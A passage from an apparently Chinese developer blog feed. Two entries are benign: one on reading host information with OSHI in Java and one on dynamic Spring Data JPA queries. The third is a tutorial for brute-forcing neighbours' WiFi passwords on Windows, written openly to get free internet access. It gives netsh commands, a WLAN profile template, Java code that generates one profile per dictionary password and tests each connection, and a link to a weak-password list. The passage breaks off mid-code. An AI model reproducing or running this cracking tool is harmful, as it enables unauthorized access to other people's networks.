class="name">groupId</span>&gt;</span>com.github.oshi<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>oshi-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;oshi.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>然后，开撸</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取主机信息</span></span><br><span class="line">SystemInfo systemInfo = <span class="keyword">new</span> SystemInfo();</span><br><span class="line"><span class="comment">// 获取操作系统信息</span></span><br><span class="line">OperatingSystem operatingSystem = systemInfo.getOperatingSystem();</span><br><span class="line">operatingSystem.getNetworkParams().getHostName();</span><br><span class="line">operatingSystem.getFamily();</span><br><span class="line">operatingSystem.getVersion().getVersion();</span><br><span class="line">operatingSystem.getVersion().getBuildNumber();</span><br><span class="line">operatingSystem.getBitness();</span><br><span class="line">operatingSystem.getProcessCount();</span><br><span class="line">operatingSystem.getThreadCount();</span><br></pre></td></tr></table></figure><p>就是这么简单，不需要不同系统引入不同的库文件，也不用自己做系统兼容。oshi自己做了兼容，目前大概兼容些这些系统： Linux, Windows, Solaris, AIX, HP-UX, FreeBSD and Mac OSX.</p><h2 id="四、对比"><a href="#四、对比" class="headerlink" title="四、对比"></a>四、对比</h2><p>以上几种方式，大概可以做个这样的总结：</p><ul><li><p>命令行：灵活度高，兼容性强，但是如果要兼容多个平台的话，自己做还是有些麻烦。</p></li><li><p>sigar：社区活跃度高，参考文档全面，麻烦在于需要不同平台引入不同的库文件。</p></li><li><p>oshi：拿来主义，使用方便，缺点在于文档少。不过个人认为看看github上的文档就够了，使用过程也没有什么坑。</p></li></ul><p>综上，因为我个人在开发的时候选择的是oshi。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;p&gt;最近在筹划做一个监控系统。其中就要获取主机信息，其中遇到一些问题。在此做个记录，以便以后查阅。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="开源之路" scheme="https://blog.weechang.xyz/categories/%E5%BC%80%E6%BA%90%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Java" scheme="https://blog.weechang.xyz/tags/Java/"/>
    
      <category term="apm" scheme="https://blog.weechang.xyz/tags/apm/"/>
    
      <category term="oshi" scheme="https://blog.weechang.xyz/tags/oshi/"/>
    
  </entry>
  
  <entry>
    <title>让你的Spring Data Jpa 像Mybatis一样灵活</title>
    <link href="https://blog.weechang.xyz/2018/11/30/spring-data-jpa-query/"/>
    <id>https://blog.weechang.xyz/2018/11/30/spring-data-jpa-query/</id>
    <published>2018-11-30T03:31:03.000Z</published>
    <updated>2018-11-30T06:08:51.641Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>为了项目快速迭代，所以一直对spring data jpa 挺有好感的。但是，一直感觉jpa的查询方式不太灵活，特别是动态查询，及动态更新。但是最近在写快速开发框架，为了解决这个问题，在网上找到了相关资料，特此记录一下。</p></blockquote><a id="more"></a><h1 id="一、关于查询"><a href="#一、关于查询" class="headerlink" title="一、关于查询"></a>一、关于查询</h1><h2 id="1-1-古老的查询方式"><a href="#1-1-古老的查询方式" class="headerlink" title="1.1 古老的查询方式"></a>1.1 古老的查询方式</h2><p>一直以来只知道spring data jpa 可以免写sql。比如说我们要根据上级Id 查询所属的子信息。可以这样写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">DeptDao</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">T</span>, <span class="title">Serializable</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">List&lt;Dept&gt; <span class="title">findAllByParentId</span><span class="params">(Long parentId)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-复杂的查询方式"><a href="#1-2-复杂的查询方式" class="headerlink" title="1.2 复杂的查询方式"></a>1.2 复杂的查询方式</h2><p>这样的代码看似达到了我们的要求，但是如果我要加一个name作为查询条件呢？之前在网上上看到了类似这样的查询方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Page&lt;Courier&gt; <span class="title">pageQuery</span><span class="params">(Courier model, Pageable pageable)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//封装查询对象Specification</span></span><br><span class="line">    Specification&lt;Courier&gt; example = <span class="keyword">new</span> Specification&lt;Courier&gt;() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Predicate <span class="title">toPredicate</span><span class="params">(Root&lt;Courier&gt; root, CriteriaQuery&lt;?&gt; query, CriteriaBuilder cb)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取客户端查询条件</span></span><br><span class="line">            String company = model.getCompany();</span><br><span class="line">            String courierNum = model.getCourierNum();</span><br><span class="line">            String type = model.getType();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//定义集合来确定Predicate[] 的长度，因为CriteriaBuilder的or方法需要传入的是断言数组</span></span><br><span class="line">            List&lt;Predicate&gt; predicates = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//对客户端查询条件进行判断,并封装Predicate断言对象</span></span><br><span class="line">            <span class="keyword">if</span> (StringUtils.isNotBlank(company)) &#123;</span><br><span class="line">                <span class="comment">//root.get("company")获取字段名</span></span><br><span class="line">                <span class="comment">//company客户端请求的字段值</span></span><br><span class="line">                <span class="comment">//as(String.class)指定该字段的类型</span></span><br><span class="line">                Predicate predicate = cb.equal(root.get(<span class="string">"company"</span>).as(String.class), company);</span><br><span class="line">                predicates.add(predicate);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (StringUtils.isNotBlank(courierNum)) &#123;</span><br><span class="line">                Predicate predicate = cb.equal(root.get(<span class="string">"courierNum"</span>).as(String.class), courierNum);</span><br><span class="line">                predicates.add(predicate);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (StringUtils.isNotBlank(type)) &#123;</span><br><span class="line">                Predicate predicate = cb.equal(root.get(<span class="string">"type"</span>).as(String.class), type);</span><br><span class="line">                predicates.add(predicate);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//判断结合中是否有数据</span></span><br><span class="line">            <span class="keyword">if</span> (predicates.size() == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//将集合转化为CriteriaBuilder所需要的Predicate[]</span></span><br><span class="line">            Predicate[] predicateArr = <span class="keyword">new</span> Predicate[predicates.size()];</span><br><span class="line">            predicateArr = predicates.toArray(predicateArr);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 返回所有获取的条件： 条件 or 条件 or 条件 or 条件</span></span><br><span class="line">            <span class="keyword">return</span> cb.or(predicateArr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用Dao方法进行条件查询</span></span><br><span class="line">    Page&lt;Courier&gt; page = courierDao.findAll(example, pageable);</span><br><span class="line">    <span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-3-优雅的查询方式"><a href="#1-3-优雅的查询方式" class="headerlink" title="1.3 优雅的查询方式"></a>1.3 优雅的查询方式</h2><p>这TM的什么鬼啊，看都不想看，太复杂了。这TM一个查询比业务逻辑的代码都还多，要你有何用。于是乎，一直很嫌弃这种SB的写法。我坚信有更简单的实现方式，但是一直以来因为懒，没有去寻找解决方案。最近终于找到了如下解决方案。</p><p>首先还是Dao方法。<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">DeptDao</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">T</span>, <span class="title">Serializable</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>然后业务调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AutoWired</span></span><br><span class="line"><span class="keyword">private</span> DeptDao deptDao;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">ExampleMatcher matcher = ExampleMatcher.matching()</span><br><span class="line">                .withMatcher(<span class="string">"name"</span> ,ExampleMatcher.GenericPropertyMatchers.startsWith()) <span class="comment">// 模糊查询匹配开头，即&#123;name&#125;%</span></span><br><span class="line">                .withMatcher(<span class="string">"remark"</span> ,ExampleMatcher.GenericPropertyMatchers.contains()) <span class="comment">// 全部模糊查询，即%&#123;remark&#125;%</span></span><br><span class="line">                .withIgnorePaths(<span class="string">"orderNum"</span>); <span class="comment">//忽略字段，即不管 orderNum 是什么值都不加入查询条件</span></span><br><span class="line">                </span><br><span class="line">baseDao.findAll(Example.of(param, matcher), pageable);</span><br></pre></td></tr></table></figure><p>使用Example 查询，会自动忽略为NULL的字段，和mybatis的查询几乎一直。</p><p>我觉得，这才是我想要的查询方式。就是这么优雅。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;p&gt;为了项目快速迭代，所以一直对spring data jpa 挺有好感的。但是，一直感觉jpa的查询方式不太灵活，特别是动态查询，及动态更新。但是最近在写快速开发框架，为了解决这个问题，在网上找到了相关资料，特此记录一下。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="日常记录" scheme="https://blog.weechang.xyz/categories/%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="Jpa" scheme="https://blog.weechang.xyz/tags/Jpa/"/>
    
      <category term="动态查询" scheme="https://blog.weechang.xyz/tags/%E5%8A%A8%E6%80%81%E6%9F%A5%E8%AF%A2/"/>
    
  </entry>
  
  <entry>
    <title>如何在Windows平台用Java代码暴力破解WIFI密码</title>
    <link href="https://blog.weechang.xyz/2018/10/22/windows-java-wifi/"/>
    <id>https://blog.weechang.xyz/2018/10/22/windows-java-wifi/</id>
    <published>2018-10-22T07:21:08.000Z</published>
    <updated>2018-10-22T08:40:18.159Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>由于新搬的地方没有覆盖移动的宽带，最近手头又紧。所以暂时先没安宽带，但是一天用流量，也撑不住啊。看着流量哗啦啦的溜走。住的地方在6楼，然后房子是底商的格局，于是就动起了蹭网的小心思，一下记录蹭网全过程。</p></blockquote><a id="more"></a><p>开始进入正题。在网上找了很多wifi破解工具，都是linux平台下用的，然后还不支持虚拟机装linux。因为很多笔记本装虚拟机都识别不了内置网卡。所以得把系统刻到U盘，然后用U盘启动。但是我现在穷得连一条内裤都没有了，哪来的U盘啊。于是就决定自己写，而且还得用Java写，写了我还得在windows上运行。</p><h1 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a>一、准备工作</h1><p>首先你得需要一台能连wifi的电脑，<br>然后你的电脑得支持Java环境，<br>最后你周围得有无线网络。</p><p>ok，话不多说，说开撸，老夫就要开撸。于是网上找到了windows下cmd无线网络操作的相关命令。如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// 列出所有可用wifi</span><br><span class="line">netsh wlan show networks mode=bssid</span><br><span class="line"></span><br><span class="line">// 添加配置文件</span><br><span class="line">netsh wlan add profile filename=FILE_NAME</span><br><span class="line"></span><br><span class="line">// 连接wifi</span><br><span class="line">netsh wlan connect name=SSID_NAME</span><br><span class="line"></span><br><span class="line">// 导出配置文件</span><br><span class="line">netsh wlan export profile key=clear</span><br><span class="line"></span><br><span class="line">// 列出配置文件</span><br><span class="line">netsh wlan show profile</span><br><span class="line"></span><br><span class="line">// 删除配置文件</span><br><span class="line">netsh wlan delete profile name=FILE_NAME</span><br><span class="line"></span><br><span class="line">// 列出接口</span><br><span class="line">netsh wlan show interface</span><br><span class="line"></span><br><span class="line">// 开启接口</span><br><span class="line">netsh interface set interface &quot;Interface Name&quot; enabled</span><br></pre></td></tr></table></figure><p>这我这篇文章中，主要会用到前四个命令，其他的命令就当给各位做拓展了。</p><p>首先需要写配置文件，方便待会使用。首先我们可以看看配置文件张啥样，导出配置文件看看就知道了。打开命令行，输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh wlan export profile key=clear</span><br></pre></td></tr></table></figure><p>就导出了配置文件，注意，这儿的配置文件默认导出在cmd执行的当前路径，如下，</p><img src="/2018/10/22/windows-java-wifi/path.png" title="文件路径"><p>我导出的文件就在 C:\Users\Admin 下面，可以看到文件都是wifi.xml方式。如 TP-LINK_5410.xml ，随便打开一个我们可以看到xml文件的具体内容，但是有一些内容是我们不需要的，我们需要的是下面这个样子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;WLANProfile xmlns=&quot;http://www.microsoft.com/networking/WLAN/profile/v1&quot;&gt;</span><br><span class="line">&lt;name&gt;SSID_NAME&lt;/name&gt;</span><br><span class="line">&lt;SSIDConfig&gt;</span><br><span class="line">    &lt;SSID&gt;</span><br><span class="line">        &lt;name&gt;SSID_NAME&lt;/name&gt;</span><br><span class="line">    &lt;/SSID&gt;</span><br><span class="line">&lt;/SSIDConfig&gt;</span><br><span class="line">&lt;connectionType&gt;ESS&lt;/connectionType&gt;</span><br><span class="line">&lt;connectionMode&gt;auto&lt;/connectionMode&gt;</span><br><span class="line">&lt;MSM&gt;</span><br><span class="line">    &lt;security&gt;</span><br><span class="line">        &lt;authEncryption&gt;</span><br><span class="line">            &lt;authentication&gt;AUTH_TYPE&lt;/authentication&gt;</span><br><span class="line">            &lt;encryption&gt;AES&lt;/encryption&gt;</span><br><span class="line">            &lt;useOneX&gt;false&lt;/useOneX&gt;</span><br><span class="line">        &lt;/authEncryption&gt;</span><br><span class="line">        &lt;sharedKey&gt;</span><br><span class="line">            &lt;keyType&gt;passPhrase&lt;/keyType&gt;</span><br><span class="line">            &lt;protected&gt;false&lt;/protected&gt;</span><br><span class="line">            &lt;keyMaterial&gt;PASSWORD&lt;/keyMaterial&gt;</span><br><span class="line">        &lt;/sharedKey&gt;</span><br><span class="line">    &lt;/security&gt;</span><br><span class="line">&lt;/MSM&gt;</span><br><span class="line">&lt;MacRandomization xmlns=&quot;http://www.microsoft.com/networking/WLAN/profile/v3&quot;&gt;</span><br><span class="line">    &lt;enableRandomization&gt;false&lt;/enableRandomization&gt;</span><br><span class="line">&lt;/MacRandomization&gt;</span><br><span class="line">&lt;/WLANProfile&gt;</span><br></pre></td></tr></table></figure><p>其中 SSID_NAME 是待会我们会用到的wifi名称， AUTH_TYPE 是wifi的加密方式， PASSWORD 是我们会暴力破解的密码变量。</p><h1 id="二、扫描WIFI"><a href="#二、扫描WIFI" class="headerlink" title="二、扫描WIFI"></a>二、扫描WIFI</h1><p>OK，背景交代得差不多了，可以开干了。首先扫描附近的WIFI，返回所有WIFI的信息，包括SSID、加密方式、信号强度（信号太弱的，我们就不进行破解了，破解了也没啥用）。扫描其实就是执行一个CMD命令的问题，先封装一个CMD执行器吧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 执行器</span><br><span class="line"> *</span><br><span class="line"> * @param cmd      CMD命令</span><br><span class="line"> * @param filePath 需要在哪个目录下执行</span><br><span class="line"> */</span><br><span class="line">private static List&lt;String&gt; execute(String cmd, String filePath) &#123;</span><br><span class="line">    Process process = null;</span><br><span class="line">    List&lt;String&gt; result = new ArrayList&lt;String&gt;();</span><br><span class="line">    try &#123;</span><br><span class="line">        if (filePath != null) &#123;</span><br><span class="line">            process = Runtime.getRuntime().exec(cmd, null, new File(filePath));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        BufferedReader bReader = new BufferedReader(new InputStreamReader(process.getInputStream(), &quot;gbk&quot;));</span><br><span class="line">        String line = null;</span><br><span class="line">        while ((line = bReader.readLine()) != null) &#123;</span><br><span class="line">            result.add(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后扫描周围wifi信息，并返回相关信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 列出所有信号较好的ssid</span><br><span class="line"> *</span><br><span class="line"> * @return 所有ssid</span><br><span class="line"> */</span><br><span class="line">public static List&lt;Ssid&gt; listSsid() &#123;</span><br><span class="line">    List&lt;Ssid&gt; ssidList = new ArrayList&lt;Ssid&gt;();</span><br><span class="line">    String cmd = Command.SHOW_NETWORKS;</span><br><span class="line">    List&lt;String&gt; result = execute(cmd, null);</span><br><span class="line">    if (result != null &amp;&amp; result.size() &gt; 0) &#123;</span><br><span class="line">        // todo 整合信息</span><br><span class="line">    &#125;</span><br><span class="line">    return ssidList;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="三、生成配置文件"><a href="#三、生成配置文件" class="headerlink" title="三、生成配置文件"></a>三、生成配置文件</h1><p>OK，接下来我们就可以开始针对每个不同的SSID生成不同的配置文件了,生成文件整个过程就是根据每个不同的密码生成一个配置文件。大概代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 配置文件生成器</span><br><span class="line"> */</span><br><span class="line">public class ProfileGenerator &#123;</span><br><span class="line"></span><br><span class="line">    private String ssid = null;</span><br><span class="line">    private String passwrodPath = null;</span><br><span class="line">    private ExecutorService threadPool = Executors.newFixedThreadPool(4);</span><br><span class="line"></span><br><span class="line">    public ProfileGenerator(String ssid, String passwrodPath) &#123;</span><br><span class="line">        this.ssid = ssid;</span><br><span class="line">        this.passwrodPath = passwrodPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 生成配置文件</span><br><span class="line">     */</span><br><span class="line">    public void genProfile() &#123;</span><br><span class="line">        List&lt;String&gt; passwordList = null;</span><br><span class="line">        int counter = 0;</span><br><span class="line">        outer:</span><br><span class="line">        while (true) &#123;</span><br><span class="line">            int start = counter * Connector.BATH_SIZE;</span><br><span class="line">            int end = (counter + 1) * Connector.BATH_SIZE - 1;</span><br><span class="line">            passwordList = FileUtils.readLine(passwrodPath, start, end);</span><br><span class="line">            if (passwordList != null &amp;&amp; passwordList.size() &gt; 0) &#123;</span><br><span class="line">                // 生成配置文件</span><br><span class="line">                for (String password : passwordList) &#123;</span><br><span class="line">                    GenThread genThread = new GenThread(ssid, password);</span><br><span class="line">                    threadPool.execute(genThread);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                break outer;</span><br><span class="line">            &#125;</span><br><span class="line">            counter++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GenThread implements Runnable &#123;</span><br><span class="line"></span><br><span class="line">    private String ssid = null;</span><br><span class="line">    private String password = null;</span><br><span class="line"></span><br><span class="line">    GenThread(String ssid, String password) &#123;</span><br><span class="line">        this.ssid = ssid;</span><br><span class="line">        this.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void run() &#123;</span><br><span class="line">        String profileContent = Profile.PROFILE.replace(Profile.WIFI_NAME, ssid);</span><br><span class="line">        profileContent = profileContent.replace(Profile.WIFI_PASSWORD, password);</span><br><span class="line">        FileUtils.writeToFile(Connector.PROFILE_TEMP_PATH + &quot;\\&quot; + password + &quot;.xml&quot;, profileContent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这儿为了加快文件生成速度，我开启了多线程。个人实际感受，如果只是几千到几万个的话，其实多线程不多线程，并没有多大区别，真正的区别在于后面尝试连接的时候。</p><p>需要哪些密码可以自己现在网上找一些字典来跑，建议顺序是 常用弱口令 =&gt; 字典面 =&gt; 随机密码（到了随机密码这儿，意义也不大了）。这儿给出一个常见弱口令的<a href="/doc/6000常用密码字典.txt">下载连接</a>。反正我只用这个弱口令破解过一个WIFI。</p><h1 id="四、遍历校验配置文件"><a href="#四、遍历校验配置文件" class="headerlink" title="四、遍历校验配置文件"></a>四、遍历校验配置文件</h1><p>接下来就是最耗时的一步了，一个个密码去校验。关键代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 校验WLAN配置文件是否正确</span><br><span class="line"> * &lt;p&gt;</span><br><span class="line"> * 校验步骤为：</span><br><span class="line"> * ---step1 添加配置文件</span><br><span class="line"> * ---step3 连接wifi</span><br><span class="line"> * ---step3 ping校验</span><br><span class="line"> */</span><br><span class="line">public synchronized boolean check(String ssid, String password) &#123;</span><br><span class="line">    System.out.println(&quot;check : &quot; + password);</span><br><span class="line">    try &#123;</span><br><span class="line">        String profileName = password + &quot;.xml&quot;;</span><br><span class="line">        if (addProfile(profileName)) &#123;</span><br><span class="line">            if (connect(ssid)) &#123;</span><br><span class="line">                Thread.sleep(50);</span><br><span class="line">                if (ping()) &#123;</span><br><span class="line">                    return true;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 添加配置文件</span><br><span class="line"> *</span><br><span class="line"> * @param profileName 添加配置文件</span><br><span class="line"> */</span><br><span class="line">private static boolean addProfile(String profileName) &#123;</span><br><span class="line">    String cmd = Command.ADD_PROFILE.replace(&quot;FILE_NAME&quot;, profileName);</span><br><span class="line">    List&lt;String&gt; result = execute(cmd, Connector.PROFILE_TEMP_PATH);</span><br><span class="line">    if (result != null &amp;&amp; result.size() &gt; 0) &#123;</span><br><span class="line">        if 